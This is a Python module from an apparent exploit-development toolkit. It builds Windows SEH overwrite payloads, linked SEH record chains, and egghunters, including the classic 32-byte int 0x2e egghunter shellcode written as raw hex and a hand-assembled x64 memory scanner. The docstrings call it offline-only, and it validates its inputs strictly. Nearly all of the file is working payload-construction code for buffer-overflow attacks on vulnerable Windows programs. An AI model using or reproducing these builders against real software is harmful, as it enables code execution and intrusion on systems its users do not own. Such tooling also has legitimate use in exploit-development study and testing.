"""Offline Windows SEH and bounded egghunter payload builders.

Only caller-supplied addresses are serialized.  The module never executes a
payload, launches a process, reads a target, or opens a network connection.
Every public builder returns the shared :class:`contract.PayloadBuild`
contract: immutable payload bytes plus exact semantic byte placements.
"""
from __future__ import annotations

import struct
from typing import Sequence

try:  # package import and direct toolkit-path import are both supported
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover - exercised by the repository's direct import style
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


WindowsBuildError = BuildError
MAX_PAYLOAD = 1 << 20


def _bytes(value: bytes | bytearray, *, name: str, maximum: int = MAX_PAYLOAD) -> bytes:
    if not isinstance(value, (bytes, bytearray)):
        raise WindowsBuildError(f"{name} must be bytes")
    raw = bytes(value)
    if len(raw) > maximum:
        raise WindowsBuildError(f"{name} exceeds {maximum}-byte cap")
    return raw


def _one_byte(value: bytes | bytearray, *, name: str) -> bytes:
    raw = _bytes(value, name=name, maximum=1)
    if len(raw) != 1:
        raise WindowsBuildError(f"{name} must contain exactly one byte")
    return raw


def _tag(value: bytes | bytearray | str) -> bytes:
    if isinstance(value, str):
        try:
            raw = value.encode("ascii")
        except UnicodeError as exc:
            raise WindowsBuildError("egg tag must be ASCII") from exc
    else:
        raw = _bytes(value, name="tag", maximum=4)
    if len(raw) != 4:
        raise WindowsBuildError("egg tag must contain exactly four bytes")
    if len(set(raw)) == 1 and raw in (b"\x00" * 4, b"\xff" * 4):
        raise WindowsBuildError("all-NUL and all-0xff egg tags are refused")
    return raw


def build_seh_overwrite(
    *,
    offset_to_nseh: int,
    seh_handler: int,
    stage: bytes,
    nseh: bytes = b"\xeb\x06\x90\x90",
    filler: bytes = b"A",
    prefix: bytes = b"",
    tail: bytes = b"",
    bad_bytes: Sequence[int] = (),
) -> PayloadBuild:
    """Build a classic 32-bit stack-linked SEH overwrite.

    ``nseh`` defaults to a six-byte short jump over nSEH + SEH.  The handler
    should be a caller-vetted pop/pop/ret (or equivalent) address from a module
    compatible with the target's SafeSEH/ASLR policy.  x64 deliberately is not
    accepted: Win64 uses table-based unwind metadata rather than a writable
    stack-linked SEH record.
    """

    if isinstance(offset_to_nseh, bool) or not isinstance(offset_to_nseh, int):
        raise WindowsBuildError("offset_to_nseh must be an integer")
    if not 0 <= offset_to_nseh <= MAX_PAYLOAD:
        raise WindowsBuildError("offset_to_nseh is outside the payload cap")
    prefix = _bytes(prefix, name="prefix")
    if len(prefix) > offset_to_nseh:
        raise WindowsBuildError("prefix is longer than offset_to_nseh")
    filler = _one_byte(filler, name="filler")
    nseh = _bytes(nseh, name="nseh", maximum=4)
    if len(nseh) != 4:
        raise WindowsBuildError("nseh must be exactly four bytes")
    stage = _bytes(stage, name="stage")
    tail = _bytes(tail, name="tail")
    handler = ensure_uint(seh_handler, 32, name="seh_handler")

    payload = (
        prefix + filler * (offset_to_nseh - len(prefix)) + nseh
        + struct.pack("<I", handler) + stage + tail
    )
    if len(payload) > MAX_PAYLOAD:
        raise WindowsBuildError("SEH payload exceeds cap")
    reject_bad_bytes(payload, bad_bytes)
    placements = {
        "prefix": 0,
        "nseh": offset_to_nseh,
        "seh": offset_to_nseh + 4,
        "stage": offset_to_nseh + 8,
        "tail": offset_to_nseh + 8 + len(stage),
        "end": len(payload),
    }
    widths = {
        "nseh": 4, "seh": 4, "stage": len(stage) or 1,
    }
    if not stage:
        widths.pop("stage")
    return PayloadBuild(
        payload=payload, placements=placements, widths=widths,
        architecture="windows-x86", strategy="seh-overwrite",
        metadata={
            "delivery": "offline-only",
            "seh_model": "x86-stack-linked",
            "safe_seh": "caller-must-confirm",
        },
    )


def build_seh_record_chain(
    *,
    record_addresses: Sequence[int],
    handler_addresses: Sequence[int],
    terminal_next: int = 0xFFFFFFFF,
    base_address: int | None = None,
) -> PayloadBuild:
    """Serialize linked x86 ``EXCEPTION_REGISTRATION_RECORD`` entries.

    Each eight-byte record is ``next, handler``.  For all but the final entry,
    ``next`` is the next caller-supplied record address.  This is a structural
    primitive useful for hand-built SEH frames and debugger verification.
    """

    try:
        records = list(record_addresses)
        handlers = list(handler_addresses)
    except TypeError as exc:
        raise WindowsBuildError("record and handler addresses must be sequences") from exc
    if not records or len(records) > 256 or len(records) != len(handlers):
        raise WindowsBuildError("record and handler sequences must have equal length in 1..256")
    records = [ensure_uint(value, 32, name=f"record_addresses[{i}]")
               for i, value in enumerate(records)]
    handlers = [ensure_uint(value, 32, name=f"handler_addresses[{i}]")
                for i, value in enumerate(handlers)]
    if len(set(records)) != len(records):
        raise WindowsBuildError("record addresses must be unique")
    if any(value & 3 for value in records):
        raise WindowsBuildError("record addresses must be four-byte aligned")
    terminal = ensure_uint(terminal_next, 32, name="terminal_next")
    if base_address is None:
        base = records[0]
    else:
        base = ensure_uint(base_address, 32, name="base_address")
    expected_records = [base + index * 8 for index in range(len(records))]
    if records != expected_records:
        raise WindowsBuildError(
            "record addresses must be contiguous eight-byte slots from base_address"
        )

    payload = bytearray()
    placements: dict[str, int] = {"records": 0}
    widths: dict[str, int] = {}
    for index, (record, handler) in enumerate(zip(records, handlers)):
        name = f"record.{index}"
        placements[name] = len(payload)
        placements[f"{name}.next"] = len(payload)
        widths[f"{name}.next"] = 4
        next_record = records[index + 1] if index + 1 < len(records) else terminal
        payload.extend(struct.pack("<I", next_record))
        placements[f"{name}.handler"] = len(payload)
        widths[f"{name}.handler"] = 4
        payload.extend(struct.pack("<I", handler))
    placements["end"] = len(payload)
    return PayloadBuild(
        payload=bytes(payload), placements=placements, widths=widths,
        architecture="windows-x86", strategy="seh-record-chain", base_address=base,
        metadata={"record_count": str(len(records)), "delivery": "offline-only"},
    )


class _Rel8Emitter:
    """Tiny deterministic byte emitter for the bounded x64 scanner."""

    def __init__(self) -> None:
        self.code = bytearray()
        self.labels: dict[str, int] = {}
        self.fixups: list[tuple[int, str]] = []

    def emit(self, data: bytes) -> int:
        offset = len(self.code)
        self.code.extend(data)
        return offset

    def label(self, name: str) -> None:
        if name in self.labels:
            raise WindowsBuildError(f"duplicate internal label {name}")
        self.labels[name] = len(self.code)

    def branch(self, opcode: int, label: str) -> None:
        self.code.extend((opcode, 0))
        self.fixups.append((len(self.code) - 1, label))

    def finish(self) -> bytes:
        for immediate, label in self.fixups:
            if label not in self.labels:
                raise WindowsBuildError(f"unresolved internal label {label}")
            displacement = self.labels[label] - (immediate + 1)
            if not -128 <= displacement <= 127:
                raise WindowsBuildError("internal egghunter branch exceeds rel8 range")
            self.code[immediate] = displacement & 0xFF
        return bytes(self.code)


def _x86_hunter(tag: bytes) -> tuple[bytes, dict[str, int], dict[str, int]]:
    # NtAccessCheckAndAuditAlarm/int 0x2e page-probing hunter, 32 bytes.
    prefix = bytes.fromhex("6681caff0f42526a0258cd2e3c055a74efb8")
    suffix = bytes.fromhex("89d7af75eaaf75e7ffe7")
    raw = prefix + tag + suffix
    return raw, {"hunter.tag_immediate": len(prefix)}, {"hunter.tag_immediate": 4}


def _x64_hunter(
    tag: bytes, *, range_start: int, range_end: int,
    failure_address: int | None,
) -> tuple[bytes, dict[str, int], dict[str, int]]:
    start = ensure_uint(range_start, 64, name="range_start")
    end = ensure_uint(range_end, 64, name="range_end")
    if start >= end:
        raise WindowsBuildError("range_start must be below range_end")
    emitter = _Rel8Emitter()
    emitter.emit(b"\x48\xba")
    start_offset = emitter.emit(struct.pack("<Q", start))       # mov rdx, start
    emitter.emit(b"\x48\xb9")
    end_offset = emitter.emit(struct.pack("<Q", end))           # mov rcx, end
    emitter.label("loop")
    # Two SCASD instructions read eight bytes.  Require rdx+7 < range_end so
    # the declared bounded range is honored even on its final iteration.
    emitter.emit(b"\x48\x8d\x42\x07")                          # lea rax, [rdx+7]
    emitter.emit(b"\x48\x39\xc8")                              # cmp rax, rcx
    emitter.branch(0x73, "failure")                              # jae failure
    emitter.emit(b"\xb8")
    tag_offset = emitter.emit(tag)                                # mov eax, tag
    emitter.emit(b"\x48\x89\xd7\xaf")                          # mov rdi, rdx; scasd
    emitter.branch(0x75, "next")                                 # jne next
    emitter.emit(b"\xaf")                                       # scasd
    emitter.branch(0x75, "next")
    emitter.emit(b"\xff\xe7")                                   # jmp rdi (after egg*2)
    emitter.label("next")
    emitter.emit(b"\x48\xff\xc2")                              # inc rdx
    emitter.branch(0xEB, "loop")
    emitter.label("failure")
    failure_offset: int | None = None
    if failure_address is None:
        emitter.emit(b"\xcc")                                   # explicit debugger stop
    else:
        target = ensure_uint(failure_address, 64, name="failure_address")
        emitter.emit(b"\x48\xb8")
        failure_offset = emitter.emit(struct.pack("<Q", target))
        emitter.emit(b"\xff\xe0")                               # jmp rax
    raw = emitter.finish()
    placements = {
        "hunter.range_start": start_offset,
        "hunter.range_end": end_offset,
        "hunter.tag_immediate": tag_offset,
    }
    widths = {key: 8 for key in ("hunter.range_start", "hunter.range_end")}
    widths["hunter.tag_immediate"] = 4
    if failure_offset is not None:
        placements["hunter.failure_address"] = failure_offset
        widths["hunter.failure_address"] = 8
    return raw, placements, widths


def build_egghunter(
    *,
    architecture: str,
    tag: bytes | str,
    stage: bytes,
    separation: bytes = b"",
    range_start: int | None = None,
    range_end: int | None = None,
    failure_address: int | None = None,
    bad_bytes: Sequence[int] = (),
) -> PayloadBuild:
    """Build hunter bytes followed by ``tag + tag + stage``.

    ``windows-x86`` emits the classic 32-byte ``int 0x2e`` page-probing form.
    ``windows-x64`` emits a bounded scanner and therefore requires a mapped
    ``[range_start, range_end)``.  The bounded form avoids pretending that one
    hard-coded Win64 syscall number works across Windows releases.
    """

    arch = architecture.strip().lower().replace("_", "-") if isinstance(architecture, str) else ""
    aliases = {
        "x86": "windows-x86", "i386": "windows-x86", "windows-x86": "windows-x86",
        "x64": "windows-x64", "amd64": "windows-x64", "windows-x64": "windows-x64",
    }
    if arch not in aliases:
        raise WindowsBuildError("architecture must be x86/i386 or x64/amd64")
    arch = aliases[arch]
    egg = _tag(tag)
    stage = _bytes(stage, name="stage")
    if not stage:
        raise WindowsBuildError("stage must be non-empty")
    separation = _bytes(separation, name="separation")
    if arch == "windows-x86":
        if range_start is not None or range_end is not None or failure_address is not None:
            raise WindowsBuildError("x86 int-0x2e hunter does not accept bounded-range arguments")
        hunter, inner_places, inner_widths = _x86_hunter(egg)
        strategy = "egghunter-int2e"
    else:
        if range_start is None or range_end is None:
            raise WindowsBuildError("x64 bounded hunter requires range_start and range_end")
        hunter, inner_places, inner_widths = _x64_hunter(
            egg, range_start=range_start, range_end=range_end,
            failure_address=failure_address,
        )
        strategy = "egghunter-bounded-scan"
    stage_offset = len(hunter) + len(separation)
    payload = hunter + separation + egg + egg + stage
    if len(payload) > MAX_PAYLOAD:
        raise WindowsBuildError("egghunter payload exceeds cap")
    reject_bad_bytes(payload, bad_bytes)
    placements = {
        "hunter": 0,
        **inner_places,
        "separation": len(hunter),
        "egg.first": stage_offset,
        "egg.second": stage_offset + 4,
        "stage": stage_offset + 8,
        "end": len(payload),
    }
    widths = {
        **inner_widths,
        "hunter": len(hunter),
        "egg.first": 4,
        "egg.second": 4,
        "stage": len(stage),
    }
    return PayloadBuild(
        payload=payload, placements=placements, widths=widths,
        architecture=arch, strategy=strategy,
        metadata={
            "delivery": "offline-only",
            "egg_hex": egg.hex(),
            "stage_entry": "immediately-after-two-tags",
        },
    )


__all__ = [
    "WindowsBuildError", "build_seh_overwrite", "build_seh_record_chain",
    "build_egghunter",
]
